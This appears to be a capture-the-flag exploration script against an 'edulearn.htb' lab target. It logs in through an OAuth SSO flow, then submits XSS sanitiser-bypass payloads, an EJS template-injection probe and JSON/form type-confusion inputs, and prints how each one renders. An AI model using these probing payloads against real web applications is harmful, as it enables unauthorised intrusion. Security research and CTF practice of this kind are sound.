#!/usr/bin/env python3
import re
import time
import urllib.parse

import requests

IP = "154.57.164.82"
PORT = 31059
BASE = f"http://{IP}:{PORT}"
APP = f"edulearn.htb:{PORT}"
SSO = f"sso.edulearn.htb:{PORT}"
CLIENT_ID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
s = requests.Session()

def req(method, path, host, **kwargs):
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return s.request(method, BASE + path, headers=headers, timeout=30, **kwargs)

email = f"integration{int(time.time())}@x.htb"
password = "password123"
req("POST", "/api/register", SSO, json={"email": email, "password": password, "name": "Integration"})
req("POST", "/api/login", SSO, json={"email": email, "password": password})
r = req("GET", "/auth", APP, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
r = req("GET", u.path + "?" + u.query, SSO, allow_redirects=False)
if r.status_code == 200:
    q = urllib.parse.parse_qs(u.query)
    r = req("POST", "/oauth/authorize", SSO, data={
        "client_id": CLIENT_ID, "scope": "email name",
        "redirect_uri": q["redirect_uri"][0], "state": q.get("state", [""])[0],
        "approved": "true",
    }, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
req("GET", u.path + "?" + u.query, APP, allow_redirects=False)

home = req("GET", "/", APP).text
assignment = re.search(r"/assignment/(\d+)", home).group(1)

cases = [
    ("comment-open", "AA<!--OPEN"),
    ("comment-tail", "AA<!--"),
    ("comment-breakout", "AA<!--><img src='https://example.invalid/comment'>"),
    ("ejs", "AA<% global.process.mainModule.require('fs') %>ZZ"),
    ("parent-close", "AA</div></div><img src='https://example.invalid/parent'>ZZ"),
    ("misnested", "AA<ul><li><p>ONE</ul><strong>TWO</li></p>ZZ"),
    ("raw-split", "AA<scr<strong>ipt>ONE</scr</strong>ipt>ZZ"),
]

def extract_fragment(html):
    p = html.find("AA")
    return html[p:p + 500].replace("\n", " ") if p >= 0 else "(marker absent)"

for name, content in cases:
    r = req("POST", "/submit", APP, data={"assignmentId": assignment, "content": content}, allow_redirects=False)
    if r.status_code != 302:
        print(name, "submit", r.status_code, r.text[:160], flush=True)
        continue
    page = req("GET", r.headers["location"], APP).text
    ids = re.findall(r"/submission/(\d+)", page)
    detail = req("GET", f"/submission/{ids[0]}", APP).text
    print(name, r.status_code, extract_fragment(detail), flush=True)

type_cases = [
    ("json-string", {"assignmentId": assignment, "content": "AAJSONSTRING"}),
    ("json-array", {"assignmentId": assignment, "content": ["AAARRAY", "<img src='https://example.invalid/array'>"]}),
    ("json-object", {"assignmentId": assignment, "content": {"a": "AAOBJECT", "b": "<img src=x>"}}),
]
for name, body in type_cases:
    r = req("POST", "/submit", APP, json=body, allow_redirects=False)
    print(name, r.status_code, r.headers.get("location"), r.text[:180].replace("\n", " "), flush=True)
    if r.status_code == 302:
        page = req("GET", r.headers["location"], APP).text
        ids = re.findall(r"/submission/(\d+)", page)
        detail = req("GET", f"/submission/{ids[0]}", APP).text
        m = re.search(r'<div class="prose prose-slate max-w-none">\s*(.*?)\s*</div>', detail, re.S)
        print(name, "rendered", (m.group(1) if m else "(not found)")[:500].replace("\n", " "), flush=True)

r = req("POST", "/submit", APP,
        data=[("assignmentId", assignment), ("content[]", "AAFORMARRAY"), ("content[]", "<img src=x>")],
        allow_redirects=False)
print("form-array", r.status_code, r.headers.get("location"), r.text[:180].replace("\n", " "), flush=True)
